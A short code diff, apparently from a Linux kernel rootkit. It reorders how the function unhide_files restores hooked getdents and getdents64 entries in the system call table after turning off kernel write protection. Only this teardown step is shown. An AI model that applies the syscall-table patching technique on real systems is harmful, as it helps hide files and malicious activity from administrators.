@@ -25,15 +25,15 @@ unhide_files(void)
 {
     if (sys_getdents) {
         disable_protection();
-        while (atomic_read(&getdents_count) > 0);
         sys_calls[__NR_getdents] = (void *)sys_getdents;
+        while (atomic_read(&getdents_count) > 0);
         enable_protection();
     }
 
     if (sys_getdents64) {
         disable_protection();
-        while (atomic_read(&getdents64_count) > 0);
         sys_calls[__NR_getdents64] = (void *)sys_getdents64;
+        while (atomic_read(&getdents64_count) > 0);
         enable_protection();
     }
 }
